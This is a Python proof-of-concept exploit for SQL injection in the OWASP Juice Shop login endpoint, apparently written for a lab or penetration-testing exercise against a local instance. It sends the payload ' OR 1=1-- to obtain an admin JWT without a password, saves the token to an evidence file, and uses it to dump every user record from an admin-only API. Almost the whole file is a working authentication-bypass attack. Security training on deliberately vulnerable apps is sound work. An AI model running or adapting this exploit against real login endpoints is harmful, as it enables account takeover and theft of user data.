#!/usr/bin/env python3
"""
c03-sqli-admin -- PoC: SQL injection in OWASP Juice Shop login endpoint
Target: http://host.docker.internal:3000/rest/user/login  (POST, JSON)

Root cause: the email field is concatenated into the backend query without
parameterization:
    SELECT * FROM Users WHERE email = '<email>' AND password = '<password>' ...
Injecting  ' OR 1=1--   closes the string literal and short-circuits the
predicate, so the first row in the Users table (id=1, role=admin) is returned
and a valid admin JWT is issued without knowing the password.

Usage: python3 c3_sqli_admin_login.py
Writes: /workspace/evidence/c3_admin_token.txt
"""
import json
import base64
import pathlib
import urllib.request

TARGET = "http://host.docker.internal:3000/rest/user/login"
PAYLOAD = {"email": "' OR 1=1--", "password": "irrelevant"}
OUT = pathlib.Path("/workspace/evidence/c3_admin_token.txt")


def b64url_decode(seg: str) -> dict:
    seg += "=" * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg))


def main() -> int:
    req = urllib.request.Request(
        TARGET,
        data=json.dumps(PAYLOAD).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as r:
        body = json.loads(r.read().decode())
        status = r.status

    token = body["authentication"]["token"]
    claims = b64url_decode(token.split(".")[1])
    data = claims.get("data", {})

    print(f"[+] HTTP {status} - authenticated with payload: {PAYLOAD}")
    print(f"[+] JWT algorithm : {json.loads(base64.urlsafe_b64decode(token.split('.')[0] + '=='))['alg']}")
    print(f"[+] user id       : {data.get('id')}")
    print(f"[+] email         : {data.get('email')}")
    print(f"[+] role          : {data.get('role')}")
    print(f"[+] token prefix  : {token[:25]}... (len={len(token)})")

    assert token.startswith("eyJ"), "unexpected token format"
    assert data.get("role") == "admin", "not an admin token"

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(token + "\n")
    print(f"[+] admin token saved to {OUT}")

    # sanity check: use the token against a privileged endpoint
    check = urllib.request.Request(
        "http://host.docker.internal:3000/api/Users/",
        headers={"Authorization": "Bearer " + token},
    )
    with urllib.request.urlopen(check, timeout=15) as r:
        payload_resp = json.loads(r.read().decode())
    users = payload_resp["data"] if isinstance(payload_resp, dict) else payload_resp
    print(f"[+] token validated against /api/Users/ -> {len(users)} user records dumped (admin-only)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
